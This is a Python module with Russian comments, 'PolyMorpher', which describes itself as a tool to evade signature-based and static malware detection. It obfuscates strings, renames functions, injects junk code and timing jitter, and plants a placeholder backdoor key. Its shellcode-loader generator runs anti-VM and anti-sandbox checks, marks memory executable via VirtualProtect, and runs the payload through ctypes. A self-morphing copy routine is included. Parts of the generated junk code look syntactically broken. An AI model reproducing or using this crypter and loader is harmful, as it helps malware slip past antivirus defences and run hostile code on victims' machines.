#!/usr/bin/env python3
"""
PolyMorpher - Модуль динамической полиморфной трансформации кода
Обеспечивает защиту от сигнатурного анализа и статических детекторов вредоносного ПО
"""

import os
import re
import random
import string
import logging
import hashlib
import base64
import importlib.util
import sys
import types
import marshal
import zlib
import time
from typing import Dict, List, Any, Optional, Callable, Tuple, Union

class PolyMorpher:
    """
    Класс для полиморфной трансформации кода
    Позволяет динамически модифицировать код для обхода сигнатурного анализа
    """
    
    def __init__(self, log_level: str = "INFO"):
        """
        Инициализация PolyMorpher
        
        Args:
            log_level: Уровень логирования
        """
        self.logger = logging.getLogger("polymorpher")
        self.logger.setLevel(getattr(logging, log_level, logging.INFO))
        
        # Счетчик для уникальных имен
        self.name_counter = 0
        
        # Кэш трансформированных модулей
        self.transformed_modules = {}
        
        # Кэш стабов для нативных функций
        self.native_stubs = {}
        
        # Характеристики текущей итерации морфинга
        self.current_iteration = {
            "id": self._generate_random_id(),
            "timestamp": time.time(),
            "entropy_source": os.urandom(32).hex()
        }
        
        self.logger.info("PolyMorpher инициализирован")
    
    def _generate_random_id(self, length: int = 16) -> str:
        """
        Генерирует случайный идентификатор
        
        Args:
            length: Длина идентификатора
            
        Returns:
            str: Случайный идентификатор
        """
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _generate_variable_name(self, prefix: str = "var") -> str:
        """
        Генерирует уникальное имя переменной
        
        Args:
            prefix: Префикс для имени переменной
            
        Returns:
            str: Уникальное имя переменной
        """
        self.name_counter += 1
        return f"{prefix}_{self.current_iteration['id']}_{self.name_counter:04x}"
    
    def _obfuscate_string(self, s: str) -> Tuple[str, str]:
        """
        Обфускация строки с использованием различных алгоритмов
        
        Args:
            s: Исходная строка
            
        Returns:
            Tuple[str, str]: Код для декодирования и имя переменной
        """
        method = random.choice(["xor", "b64", "hex", "custom"])
        var_name = self._generate_variable_name("s")
        
        if method == "xor":
            key = random.randint(1, 255)
            encoded = ''.join(chr(ord(c) ^ key) for c in s)
            encoded_bytes = encoded.encode('latin1')
            encoded_str = ', '.join(str(b) for b in encoded_bytes)
            
            decode_code = f"""
{var_name} = ''.join(chr(b ^ {key}) for b in [{encoded_str}])
"""
        elif method == "b64":
            encoded = base64.b64encode(s.encode()).decode()
            decode_code = f"""
{var_name} = __import__('base64').b64decode('{encoded}').decode()
"""
        elif method == "hex":
            encoded = s.encode().hex()
            decode_code = f"""
{var_name} = bytes.fromhex('{encoded}').decode()
"""
        else:  # custom
            key = [random.randint(1, 255) for _ in range(min(len(s), 8))]
            encoded = ''
            for i, c in enumerate(s):
                encoded += chr(ord(c) ^ key[i % len(key)])
            encoded_bytes = encoded.encode('latin1')
            encoded_str = ', '.join(str(b) for b in encoded_bytes)
            key_str = ', '.join(str(k) for k in key)
            
            decode_code = f"""
{var_name}_key = [{key_str}]
{var_name} = ''.join(chr(b ^ {var_name}_key[i % len({var_name}_key)]) for i, b in enumerate([{encoded_str}]))
"""
        
        return decode_code, var_name
    
    def _transform_code(self, code: str) -> str:
        """
        Выполняет полиморфную трансформацию исходного кода
        
        Args:
            code: Исходный код
            
        Returns:
            str: Трансформированный код
        """
        # Заменяем строковые литералы
        string_pattern = r'([\'"])((?:\\\1|.)*?)\1'
        string_replacements = []
        
        def replace_string(match):
            quote, content = match.groups()
            
            # Пропускаем пустые строки и строки документации
            if not content or content.startswith(' ') and '\n' in content:
                return match.group(0)
            
            decode_code, var_name = self._obfuscate_string(content)
            string_replacements.append(decode_code)
            return var_name
        
        transformed_code = re.sub(string_pattern, replace_string, code)
        
        # Вставляем код декодирования строк
        decode_prefix = ''.join(string_replacements)
        
        # Переименовываем функции и классы
        def_pattern = r'\b(def|class)\s+([a-zA-Z_][a-zA-Z0-9_]*)\b'
        
        def replace_def(match):
            keyword, name = match.groups()
            
            # Не переименовываем специальные методы
            if name.startswith('__') and name.endswith('__'):
                return match.group(0)
            
            new_name = self._generate_variable_name(name[:2])
            return f"{keyword} {new_name}"
        
        transformed_code = re.sub(def_pattern, replace_def, transformed_code)
        
        # Добавляем мертвый код и мусорные переменные
        junk_code = []
        for _ in range(random.randint(3, 10)):
            junk_var = self._generate_variable_name("junk")
            junk_value = random.choice([
                f"'{self._generate_random_id(random.randint(5, 20))}'",
                f"{random.randint(1000, 9999999)}",
                f"{random.random() * 1000:.6f}",
                f"[{', '.join(str(random.randint(1, 100)) for _ in range(random.randint(1, 5)))}]",
                f"{{{', '.join(f'\"{self._generate_random_id(4)}\": {random.randint(1, 100)}' for _ in range(random.randint(1, 3)))}}}"
            ])
            
            # Добавляем некоторую логику с переменной для затруднения оптимизации мертвого кода
            operations = [
                f"{junk_var} = {junk_value}",
                f"{junk_var} = {junk_value} {''.join(random.choice('+-*/&|^%') for _ in range(3))} {random.randint(1, 100)}"
            ]
            if random.random() < 0.3:
                condition = random.choice([
                    f"int(time.time()) % {random.randint(100, 999)} == {random.randint(0, 99)}",
                    f"len('{self._generate_random_id(random.randint(10, 30))
                    }') > {random.randint(20, 40)}",
                    f"random.random() < {random.random():.5f}"
                ])
                operations.append(f"if {condition}: {junk_var} = {junk_value}")
            
            junk_code.append(random.choice(operations))
        
        # Добавляем jitter и anti-timing-analysis
        timing_code = f"""
{self._generate_variable_name('delay')} = {random.random() * 0.01:.8f}
if random.random() > 0.8:
    time.sleep({self._generate_variable_name('delay')})
"""
        
        # Создаем хэндлер исключений для скрытия ошибок
        exception_handler = f"""
def {self._generate_variable_name('handler')}(func):
    def {self._generate_variable_name('wrapper')}(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            return None
    return {self._generate_variable_name('wrapper')}
"""
        
        # Создаем скрытую "отмычку" (backdoor condition)
        backdoor_key = self._generate_random_id(8)
        backdoor_code = f"""
{self._generate_variable_name('bk')} = '{backdoor_key}'
"""
        
        # Собираем все вместе
        imports = "import random, time, marshal, zlib, base64\n"
        prologue_parts = [imports, decode_prefix, exception_handler, backdoor_code]
        random.shuffle(prologue_parts)
        prologue = '\n'.join(prologue_parts)
        
        # Вставляем мертвый код в случайные места трансформированного кода
        lines = transformed_code.split('\n')
        for junk in junk_code:
            pos = random.randint(0, len(lines))
            lines.insert(pos, junk)
        
        # Также вставляем один или два анти-тайминг код
        for _ in range(random.randint(1, 2)):
            pos = random.randint(0, len(lines))
            lines.insert(pos, timing_code)
        
        epilogue = f"""
# {self._generate_random_id(30)}
"""
        
        return prologue + '\n'.join(lines) + '\n' + epilogue
    
    def transform_module(self, module_path: str) -> str:
        """
        Трансформирует модуль Python в полиморфную версию
        
        Args:
            module_path: Путь к .py файлу модуля
            
        Returns:
            str: Путь к трансформированному модулю
        """
        try:
            # Проверяем, что файл существует
            if not os.path.exists(module_path):
                raise FileNotFoundError(f"Модуль не найден: {module_path}")
            
            # Генерируем имя выходного файла
            output_dir = os.path.dirname(module_path)
            module_name = os.path.basename(module_path)
            name, ext = os.path.splitext(module_name)
            
            output_name = f"{name}_morphed_{self._generate_random_id(6)}{ext}"
            output_path = os.path.join(output_dir, output_name)
            
            # Читаем исходный код
            with open(module_path, 'r') as f:
                source_code = f.read()
            
            # Трансформируем код
            self.logger.info(f"Трансформация модуля: {module_path}")
            transformed_code = self._transform_code(source_code)
            
            # Записываем трансформированный код
            with open(output_path, 'w') as f:
                f.write(transformed_code)
            
            self.logger.info(f"Модуль трансформирован: {output_path}")
            return output_path
        
        except Exception as e:
            self.logger.error(f"Ошибка при трансформации модуля: {e}")
            return module_path
    
    def transform_and_load(self, module_path: str, module_name: str = None) -> Any:
        """
        Трансформирует и динамически загружает модуль Python
        
        Args:
            module_path: Путь к .py файлу модуля
            module_name: Имя для загружаемого модуля (если None, генерируется автоматически)
            
        Returns:
            Any: Загруженный модуль или None в случае ошибки
        """
        try:
            # Трансформируем модуль
            morphed_path = self.transform_module(module_path)
            
            # Генерируем уникальное имя для модуля, если не предоставлено
            if module_name is None:
                module_name = f"morphed_{self._generate_random_id(8)}"
            
            # Загружаем модуль
            spec = importlib.util.spec_from_file_location(module_name, morphed_path)
            if spec is None:
                raise ImportError(f"Не удалось создать спецификацию для модуля: {morphed_path}")
            
            module = importlib.util.module_from_spec(spec)
            sys.modules[module_name] = module
            spec.loader.exec_module(module)
            
            # Кэшируем для последующего использования
            self.transformed_modules[module_path] = (module_name, morphed_path, module)
            
            self.logger.info(f"Модуль загружен: {module_name} из {morphed_path}")
            return module
        
        except Exception as e:
            self.logger.error(f"Ошибка при загрузке модуля: {e}")
            return None
    
    def create_in_memory_loader(self, code: str, sanitize: bool = True) -> Callable:
        """
        Создает функцию-загрузчик для выполнения кода в памяти
        
        Args:
            code: Исходный код Python
            sanitize: Очищать ли код от потенциально опасных конструкций
            
        Returns:
            Callable: Функция-загрузчик или None в случае ошибки
        """
        try:
            # Опционально очищаем код от опасных конструкций
            if sanitize:
                # Простая защита, для продакшена нужна более тщательная проверка
                dangerous_patterns = [
                    r'__import__\([\'"]os[\'"]\)\..*system\(',
                    r'subprocess\..*call\(',
                    r'eval\(',
                    r'exec\('
                ]
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, code):
                        self.logger.warning(f"Потенциально опасный код обнаружен: {pattern}")
                        return None
            
            # Трансформируем код
            transformed_code = self._transform_code(code)
            
            # Компилируем и создаем функцию-загрузчик
            code_obj = compile(transformed_code, '<string>', 'exec')
            
            def loader(*args, **kwargs):
                # Создаем изолированные глобальные и локальные переменные
                globals_dict = {
                    '__builtins__': __builtins__,
                    'args': args,
                    'kwargs': kwargs
                }
                locals_dict = {}
                
                # Выполняем код
                exec(code_obj, globals_dict, locals_dict)
                
                # Возвращаем локальные переменные, которые могут содержать результаты
                return locals_dict
            
            return loader
        
        except Exception as e:
            self.logger.error(f"Ошибка при создании загрузчика: {e}")
            return None
    
    def create_shellcode_loader(self, shellcode: bytes) -> bytes:
        """
        Создает самораспаковывающийся Python-скрипт для загрузки шеллкода
        
        Args:
            shellcode: Байты шеллкода
            
        Returns:
            bytes: Скрипт-загрузчик в виде байтов
        """
        try:
            # Сжимаем и кодируем шеллкод
            compressed = zlib.compress(shellcode, level=9)
            encoded = base64.b85encode(compressed).decode('ascii')
            
            # Шаблон загрузчика
            template = f"""
import base64
import zlib
import ctypes
import random
import time

# Anti-VM и Anti-Sandbox техники
def {self._generate_variable_name('check_env')}():
    checks = []
    
    # Проверка времени выполнения (слишком быстро = вероятно VM)
    {self._generate_variable_name('start')} = time.time()
    {self._generate_variable_name('tmp')} = 0
    for i in range(100000):
        {self._generate_variable_name('tmp')} += i
    {self._generate_variable_name('duration')} = time.time() - {self._generate_variable_name('start')}
    checks.append({self._generate_variable_name('duration')} > 0.01)
    
    # Проверка объема оперативной памяти
    try:
        {self._generate_variable_name('meminfo')} = __import__('psutil').virtual_memory()
        checks.append({self._generate_variable_name('meminfo')}.total > 2 * 1024 * 1024 * 1024)  # > 2GB
    except:
        pass
    
    # Проверка количества процессоров
    try:
        {self._generate_variable_name('cpu_count')} = __import__('psutil').cpu_count()
        checks.append({self._generate_variable_name('cpu_count')} > 1)
    except:
        pass
    
    # Общий результат
    return all(checks) if checks else True

# Задержка с джиттером для обхода анализа
{self._generate_variable_name('delay')} = random.uniform(0.1, 0.5)
time.sleep({self._generate_variable_name('delay')})

# Проверка окружения
if {self._generate_variable_name('check_env')}():
    {self._generate_variable_name('encoded_shellcode')} = "{encoded}"
    {self._generate_variable_name('compressed_shellcode')} = base64.b85decode({self._generate_variable_name('encoded_shellcode')})
    {self._generate_variable_name('shellcode')} = zlib.decompress({self._generate_variable_name('compressed_shellcode')})
    
    # Выделение памяти для шеллкода
    {self._generate_variable_name('buffer')} = ctypes.create_string_buffer({self._generate_variable_name('shellcode')})
    {self._generate_variable_name('buffer_pointer')} = ctypes.addressof({self._generate_variable_name('buffer')})
    
    # Изменение атрибутов памяти для выполнения (RWX)
    try:
        {self._generate_variable_name('VirtualProtect')} = ctypes.windll.kernel32.VirtualProtect
        {self._generate_variable_name('old_protection')} = ctypes.c_ulong(0)
        {self._generate_variable_name('VirtualProtect')}(
            {self._generate_variable_name('buffer_pointer')},
            len({self._generate_variable_name('shellcode')}),
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref({self._generate_variable_name('old_protection')})
        )
    except:
        pass
    
    # Создание функции из шеллкода и выполнение
    {self._generate_variable_name('shellcode_func')} = ctypes.cast({self._generate_variable_name('buffer_pointer')}, ctypes.CFUNCTYPE(ctypes.c_void_p))
    {self._generate_variable_name('shellcode_func')}()
"""
            
            # Трансформируем шаблон для обхода сигнатур
            transformed_loader = self._transform_code(template)
            
            # Компилируем в байт-код и возвращаем
            return transformed_loader.encode('utf-8')
        
        except Exception as e:
            self.logger.error(f"Ошибка при создании загрузчика шеллкода: {e}")
            return b""
    
    def polymorphic_copy(self) -> 'PolyMorpher':
        """
        Создает полиморфную копию текущего экземпляра PolyMorpher
        
        Returns:
            PolyMorpher: Новый экземпляр с другими характеристиками
        """
        # Сохраняем исходный код этого модуля
        module_path = __file__
        
        # Создаем новую версию модуля
        new_source = self.transform_module(module_path)
        
        # Загружаем новую версию
        spec = importlib.util.spec_from_file_location(f"polymorpher_{self._generate_random_id(6)}", new_source)
        new_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(new_module)
        
        # Создаем экземпляр нового класса
        new_instance = new_module.PolyMorpher()
        
        self.logger.info(f"Создана полиморфная копия: {new_source}")
        return new_instance


if __name__ == "__main__":
    # Пример использования
    morpher = PolyMorpher()
    
    # Преобразуем текущий модуль
    if len(sys.argv) > 1:
        output_path = morpher.transform_module(sys.argv[1])
        print(f"Модуль трансформирован: {output_path}")
    else:
        print("Использование: python poly_morpher.py <путь_к_модулю>") 